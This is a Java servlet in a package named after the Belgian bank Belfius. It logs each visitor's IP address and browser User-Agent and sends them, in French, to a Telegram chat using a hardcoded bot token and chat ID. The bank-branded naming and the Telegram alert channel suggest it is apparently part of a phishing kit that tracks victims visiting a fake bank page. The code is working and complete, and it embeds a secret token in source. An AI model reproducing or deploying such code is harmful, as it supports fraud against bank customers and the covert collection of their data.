package com.example.belfius;

import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;

@WebServlet("/visit-log")
public class VisitLogServlet extends HttpServlet {

    private static final String BOT_TOKEN = "5529205468:AAEmNwJzZ0oQ4X_RVS0vhEL_GO4xpaytvwE";
    private static final String CHAT_ID   = "5061239044";

    @Override
    protected void doPost(HttpServletRequest req, HttpServletResponse resp)
            throws ServletException, IOException {

        req.setCharacterEncoding("UTF-8");

        int visitorNumber = getNextCounter(req, "visitors-counter.txt");

        String ip = req.getHeader("X-Forwarded-For");
        if (ip == null || ip.isEmpty()) {
            ip = req.getRemoteAddr();
        }
        String userAgent = req.getHeader("User-Agent");
        if (userAgent == null) userAgent = "Inconnu";

        StringBuilder sb = new StringBuilder();
        sb.append("Nouveau visiteur sur la page d'accueil\n\n");
        sb.append("Visitor #").append(visitorNumber).append("\n");
        sb.append("IP : ").append(ip).append("\n");
        sb.append("User Agent : ").append(userAgent).append("\n");

        sendToTelegram(sb.toString());

        resp.setContentType("application/json");
        resp.getWriter().write("{\"status\":\"ok\",\"visitor\":" + visitorNumber + "}");
    }

    private int getNextCounter(HttpServletRequest req, String fileName) {
        try {
            String basePath = req.getServletContext().getRealPath("/");
            File f = new File(basePath, fileName);
            int num = 1;
            if (f.exists()) {
                BufferedReader br = new BufferedReader(new FileReader(f));
                String line = br.readLine();
                br.close();
                if (line != null && !line.trim().isEmpty()) {
                    num = Integer.parseInt(line.trim()) + 1;
                }
            }
            FileWriter fw = new FileWriter(f, false);
            fw.write(String.valueOf(num));
            fw.close();
            return num;
        } catch (Exception e) {
            e.printStackTrace();
            return 1;
        }
    }

    private void sendToTelegram(String text) {
        HttpURLConnection conn = null;
        try {
            String urlString = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";
            URL url = new URL(urlString);

            String data = "chat_id=" + URLEncoder.encode(CHAT_ID, "UTF-8")
                        + "&text=" + URLEncoder.encode(text, "UTF-8")
                        + "&parse_mode=" + URLEncoder.encode("Markdown", "UTF-8");

            conn = (HttpURLConnection) url.openConnection();
            conn.setDoOutput(true);
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type",
                    "application/x-www-form-urlencoded");

            OutputStream os = conn.getOutputStream();
            os.write(data.getBytes("UTF-8"));
            os.flush();
            os.close();

            int code = conn.getResponseCode();
            InputStream is = (code >= 200 && code < 300)
                    ? conn.getInputStream() : conn.getErrorStream();
            if (is != null) {
                BufferedReader br = new BufferedReader(new InputStreamReader(is));
                while (br.readLine() != null) {
                    // ignore
                }
                br.close();
            }
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            if (conn != null) conn.disconnect();
        }
    }
}
